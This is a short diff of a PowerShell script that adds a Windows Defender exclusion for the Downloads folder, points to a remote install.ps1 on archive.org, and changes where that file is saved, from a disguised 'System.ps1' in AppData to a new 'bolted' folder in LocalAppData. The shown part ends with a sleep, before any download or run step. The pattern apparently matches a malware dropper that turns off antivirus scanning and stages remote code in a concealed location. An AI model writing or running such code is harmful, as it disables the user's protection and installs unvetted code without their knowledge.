@@ -1,6 +1,11 @@
 Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads
 $url = 'https://archive.org/download/install_202604/install.ps1'
-$outputFile = [System.IO.Path]::Combine($env:USERPROFILE, 'Appdata', 'System.ps1')
+
+$directoryPath = [System.IO.Path]::Combine($env:LOCALAPPDATA, 'bolted')
+if (-not (Test-Path $directoryPath)) {
+    New-Item -Path $directoryPath -ItemType Directory
+}
+$outputFile = [System.IO.Path]::Combine($directoryPath, 'install.ps1')
 
 Start-Sleep -Milliseconds 100 
 
